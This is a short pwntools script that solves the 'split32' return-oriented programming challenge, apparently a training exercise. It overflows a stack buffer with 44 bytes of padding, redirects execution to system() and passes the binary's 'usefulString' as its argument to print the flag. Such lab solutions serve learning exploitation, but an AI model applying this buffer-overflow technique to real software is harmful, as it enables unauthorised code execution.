from pwn import *

X32_PADDING = 44

elf = context.binary = ELF('split32')

print_flag_addr = p32(elf.symbols.usefulString)
system_call = p32(elf.symbols.system)

# BBBB is return addr for system call
payload = (b"A" * X32_PADDING) + system_call + b"B" * 4 + print_flag_addr
io = process(elf.path)
io.recvuntil('> ')
io.sendline(payload)
flag = io.recvall()
print(flag)
